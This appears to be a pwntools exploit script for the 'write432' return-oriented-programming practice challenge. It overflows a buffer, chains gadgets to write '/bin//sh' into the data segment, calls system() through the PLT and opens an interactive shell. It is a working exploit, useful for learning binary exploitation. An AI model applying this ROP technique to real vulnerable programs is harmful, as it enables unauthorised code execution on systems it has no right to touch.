from pwn import *

mov_ebp_to_edi = 0x08048670 # mov dword ptr [edi], ebp ; ret
pop_edi_ebp    = 0x080486da # pop edi ; pop ebp ; ret

# DO NOT write at start of data segment, it gets used by libc and fucks things up.
data_seg   = 0x804a000 + 0x50
system_plt = 0x8048430

# EIP offset is at 44
rop = "A" * 44

# Write "/bin/sh" to data_seg
rop += p32(pop_edi_ebp)
rop += p32(data_seg)
rop += "/bin"
rop += p32(mov_ebp_to_edi)

rop += p32(pop_edi_ebp)
rop += p32(data_seg+4)
rop += "//sh"
rop += p32(mov_ebp_to_edi)

# Call system("/bin/sh")
rop += p32(system_plt)
rop += 'junk'
rop += p32(data_seg)

# Start process and send rop chain
e = process('write432')
print e.recv()
e.sendline(rop)
e.interactive()
